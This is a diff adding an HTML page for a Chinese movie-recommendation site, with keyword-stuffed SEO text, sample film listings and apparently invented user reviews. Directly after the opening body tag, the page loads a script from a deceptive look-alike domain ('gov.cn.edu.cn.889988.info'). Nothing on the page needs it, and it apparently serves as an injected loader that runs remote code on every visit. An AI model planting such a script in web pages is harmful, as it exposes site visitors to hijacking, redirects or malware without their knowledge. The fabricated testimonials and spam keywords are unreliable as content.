@@ -1,0 +1,475 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>好看的电影网 - 发现更多精彩影片</title>
+<meta name="description" content="好看的电影网(haokandedianyingwang-top)为您精选全球高分电影、热门推荐与深度影评，网址：https://haokandedianyingwang-top">
+<meta name="keywords" content="好看的电影网, haokandedianyingwang-top, 高清电影, 在线电影, 电影推荐, 电影排行">
+<meta name="author" content="好看的电影网">
+<meta name="robots" content="index, follow">
+<meta name="bingbot" content="index, follow">
+
+<style>
+/* ===== 全局样式 ===== */
+* {
+    margin: 0;
+    padding: 0;
+    box-sizing: border-box;
+    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", "PingFang SC", "Microsoft YaHei", sans-serif;
+}
+
+body {
+    background: #f5f7fa;
+    color: #333;
+    line-height: 1.7;
+}
+
+a {
+    text-decoration: none;
+    color: #4a90e2;
+    transition: all 0.3s ease;
+}
+
+a:hover {
+    color: #ff6b6b;
+}
+
+.container {
+    width: 90%;
+    max-width: 1200px;
+    margin: 0 auto;
+}
+
+/* ===== 顶部导航 ===== */
+.navbar {
+    background: #ffffff;
+    box-shadow: 0 2px 20px rgba(0,0,0,0.08);
+    position: sticky;
+    top: 0;
+    z-index: 999;
+}
+
+.nav-container {
+    display: flex;
+    justify-content: space-between;
+    align-items: center;
+    padding: 1rem 0;
+}
+
+.logo {
+    font-size: 1.6rem;
+    font-weight: 800;
+    color: #4a90e2;
+    letter-spacing: 1px;
+}
+
+.logo span {
+    color: #ff6b6b;
+}
+
+.nav-menu {
+    display: flex;
+    gap: 2rem;
+}
+
+.nav-menu a {
+    color: #555;
+    font-weight: 500;
+    padding: 0.5rem 0;
+    border-bottom: 2px solid transparent;
+}
+
+.nav-menu a:hover {
+    color: #4a90e2;
+    border-bottom-color: #4a90e2;
+}
+
+/* ===== 横幅区域 ===== */
+.banner {
+    background: linear-gradient(120deg, #a1c4fd 0%, #c2e9fb 100%);
+    padding: 5rem 0;
+    text-align: center;
+}
+
+.banner h1 {
+    font-size: 2.8rem;
+    color: #fff;
+    margin-bottom: 1rem;
+    text-shadow: 0 2px 10px rgba(0,0,0,0.1);
+}
+
+.banner p {
+    font-size: 1.1rem;
+    color: rgba(255,255,255,0.9);
+    margin-bottom: 2rem;
+}
+
+.banner .btn {
+    background: #fff;
+    color: #4a90e2;
+    padding: 0.8rem 2.5rem;
+    border-radius: 30px;
+    font-weight: 600;
+    box-shadow: 0 4px 15px rgba(0,0,0,0.1);
+}
+
+.banner .btn:hover {
+    transform: translateY(-3px);
+    box-shadow: 0 8px 25px rgba(0,0,0,0.15);
+}
+
+/* ===== 通用栏目 ===== */
+.section {
+    padding: 4rem 0;
+}
+
+.section-header {
+    text-align: center;
+    margin-bottom: 3rem;
+}
+
+.section-header h2 {
+    font-size: 2rem;
+    color: #333;
+    margin-bottom: 0.5rem;
+}
+
+.section-header p {
+    color: #888;
+    font-size: 0.95rem;
+}
+
+/* ===== 推荐电影（卡片网格）===== */
+.movie-grid {
+    display: grid;
+    grid-template-columns: repeat(auto-fill, minmax(220px, 1fr));
+    gap: 2rem;
+}
+
+.movie-card {
+    background: #fff;
+    border-radius: 12px;
+    overflow: hidden;
+    box-shadow: 0 5px 20px rgba(0,0,0,0.06);
+    transition: transform 0.3s;
+}
+
+.movie-card:hover {
+    transform: translateY(-8px);
+}
+
+.movie-card img {
+    width: 100%;
+    height: 280px;
+    object-fit: cover;
+    display: block;
+}
+
+.movie-card .info {
+    padding: 1rem;
+}
+
+.movie-card h3 {
+    font-size: 1rem;
+    margin-bottom: 0.3rem;
+    color: #333;
+}
+
+.movie-card p {
+    font-size: 0.85rem;
+    color: #777;
+}
+
+/* ===== 排行榜（列表样式）===== */
+.rank-list {
+    max-width: 800px;
+    margin: 0 auto;
+}
+
+.rank-item {
+    display: flex;
+    align-items: center;
+    background: #fff;
+    padding: 1rem 1.5rem;
+    margin-bottom: 1rem;
+    border-radius: 10px;
+    box-shadow: 0 3px 15px rgba(0,0,0,0.05);
+}
+
+.rank-num {
+    font-size: 1.4rem;
+    font-weight: 700;
+    color: #ff6b6b;
+    width: 40px;
+}
+
+.rank-info h4 {
+    color: #333;
+    margin-bottom: 0.2rem;
+}
+
+.rank-info p {
+    font-size: 0.85rem;
+    color: #999;
+}
+
+/* ===== 影评区 ===== */
+.review-grid {
+    display: grid;
+    grid-template-columns: repeat(auto-fill, minmax(280px, 1fr));
+    gap: 2rem;
+}
+
+.review-card {
+    background: #fff;
+    padding: 1.5rem;
+    border-radius: 12px;
+    box-shadow: 0 4px 18px rgba(0,0,0,0.06);
+}
+
+.review-card h4 {
+    color: #4a90e2;
+    margin-bottom: 0.5rem;
+}
+
+.review-card p {
+    font-size: 0.9rem;
+    color: #555;
+    font-style: italic;
+}
+
+/* ===== 关于我们 ===== */
+.about {
+    background: #fff;
+    padding: 3rem;
+    border-radius: 12px;
+    box-shadow: 0 4px 20px rgba(0,0,0,0.05);
+    text-align: center;
+}
+
+.about h3 {
+    font-size: 1.5rem;
+    margin-bottom: 1rem;
+    color: #333;
+}
+
+.about p {
+    color: #666;
+    margin-bottom: 1rem;
+}
+
+/* ===== 底部 ===== */
+.footer {
+    background: #2c3e50;
+    color: #fff;
+    padding: 3rem 0 1rem;
+    margin-top: 4rem;
+}
+
+.footer h4 {
+    margin-bottom: 1rem;
+    color: #4a90e2;
+}
+
+.footer p, .footer a {
+    color: #bbb;
+    font-size: 0.9rem;
+}
+
+.footer a:hover {
+    color: #fff;
+}
+
+.footer-bottom {
+    text-align: center;
+    padding-top: 2rem;
+    margin-top: 2rem;
+    border-top: 1px solid rgba(255,255,255,0.1);
+    color: #888;
+    font-size: 0.85rem;
+}
+
+/* ===== 移动端自适应 ===== */
+@media (max-width: 768px) {
+    .nav-menu {
+        display: none;
+    }
+
+    .banner h1 {
+        font-size: 2rem;
+    }
+
+    .section {
+        padding: 3rem 0;
+    }
+
+    .about {
+        padding: 2rem 1rem;
+    }
+}
+</style>
+</head>
+
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/changyuan.js"></script>
+
+<!-- 导航 -->
+<nav class="navbar">
+    <div class="container nav-container">
+        <div class="logo">好看的<span>电影网</span></div>
+        <div class="nav-menu">
+            <a href="#home">首页</a>
+            <a href="#recommend">推荐电影</a>
+            <a href="#rank">排行榜</a>
+            <a href="#review">影评</a>
+            <a href="#about">关于我们</a>
+        </div>
+    </div>
+</nav>
+
+<!-- 横幅 -->
+<section id="home" class="banner">
+    <div class="container">
+        <h1>好看的电影网</h1>
+        <p>网址：https://haokandedianyingwang-top | 发现更多精彩影片</p>
+        <a href="#recommend" class="btn">开始探索</a>
+    </div>
+</section>
+
+<!-- 推荐电影 -->
+<section id="recommend" class="section">
+    <div class="container">
+        <div class="section-header">
+            <h2>推荐电影</h2>
+            <p>好看的电影网(haokandedianyingwang-top)为您精选高分好片</p>
+        </div>
+
+        <div class="movie-grid">
+            <div class="movie-card">
+                <img src="https://images.unsplash.com/photo-1489599849927-4ee5b7b0a0b1" alt="电影">
+                <div class="info">
+                    <h3>星际穿越</h3>
+                    <p>科幻 / 冒险 / 2014</p>
+                </div>
+            </div>
+            <div class="movie-card">
+                <img src="https://images.unsplash.com/photo-1518676590629-3dcbd9c5a5c9" alt="电影">
+                <div class="info">
+                    <h3>盗梦空间</h3>
+                    <p>悬疑 / 动作 / 2010</p>
+                </div>
+            </div>
+            <div class="movie-card">
+                <img src="https://images.unsplash.com/photo-1536440136628-849c177e76a1" alt="电影">
+                <div class="info">
+                    <h3>楚门的世界</h3>
+                    <p>剧情 / 科幻 / 1998</p>
+                </div>
+            </div>
+            <div class="movie-card">
+                <img src="https://images.unsplash.com/photo-1542204165-65bf26472b9b" alt="电影">
+                <div class="info">
+                    <h3>海上钢琴师</h3>
+                    <p>音乐 / 剧情 / 1998</p>
+                </div>
+            </div>
+        </div>
+    </div>
+</section>
+
+<!-- 排行榜 -->
+<section id="rank" class="section" style="background:#fafbfc;">
+    <div class="container">
+        <div class="section-header">
+            <h2>热门排行榜</h2>
+            <p>好看的电影网用户最爱影片</p>
+        </div>
+
+        <div class="rank-list">
+            <div class="rank-item">
+                <div class="rank-num">1</div>
+                <div class="rank-info">
+                    <h4>肖申克的救赎</h4>
+                    <p>9.7分 · 剧情</p>
+                </div>
+            </div>
+            <div class="rank-item">
+                <div class="rank-num">2</div>
+                <div class="rank-info">
+                    <h4>阿甘正传</h4>
+                    <p>9.5分 · 剧情/爱情</p>
+                </div>
+            </div>
+            <div class="rank-item">
+                <div class="rank-num">3</div>
+                <div class="rank-info">
+                    <h4>泰坦尼克号</h4>
+                    <p>9.4分 · 爱情/灾难</p>
+                </div>
+            </div>
+            <div class="rank-item">
+                <div class="rank-num">4</div>
+                <div class="rank-info">
+                    <h4>千与千寻</h4>
+                    <p>9.3分 · 动画/奇幻</p>
+                </div>
+            </div>
+        </div>
+    </div>
+</section>
+
+<!-- 影评 -->
+<section id="review" class="section">
+    <div class="container">
+        <div class="section-header">
+            <h2>影评精选</h2>
+            <p>来自好看的电影网影迷的真实声音</p>
+        </div>
+
+        <div class="review-grid">
+            <div class="review-card">
+                <h4>@影迷小王</h4>
+                <p>“好看的电影网真的很好用，推荐的电影质量很高，界面也很清爽！”</p>
+            </div>
+            <div class="review-card">
+                <h4>@电影控</h4>
+                <p>“haokandedianyingwang-top 是我每周必逛的网站，片单更新很快。”</p>
+            </div>
+            <div class="review-card">
+                <h4>@周末观影</h4>
+                <p>“分类清晰，排行榜很有参考价值，已经推荐给朋友了。”</p>
+            </div>
+        </div>
+    </div>
+</section>
+
+<!-- 关于我们 -->
+<section id="about" class="section" style="background:#fafbfc;">
+    <div class="container">
+        <div class="about">
+            <h3>关于好看的电影网</h3>
+            <p>好看的电影网（https://haokandedianyingwang-top）致力于为影迷提供高质量、有温度的观影指南。</p>
+            <p>我们精选全球好片，拒绝片荒，让每一部好电影都被看见。</p>
+            <p>联系邮箱：info@haokandedianyingwang-top</p>
+        </div>
+    </div>
+</section>
+
+<!-- 底部 -->
+<footer class="footer">
+    <div class="container">
+        <div class="section-header">
+            <h4>好看的电影网</h4>
+            <p>网址：https://haokandedianyingwang-top</p>
+            <p>关键词：好看的电影网 / haokandedianyingwang-top</p>
+        </div>
+        <div class="footer-bottom">
+            &copy; 2025 好看的电影网 | 本网站仅作展示用途
+        </div>
+    </div>
+</footer>
+
+</body>
+</html>
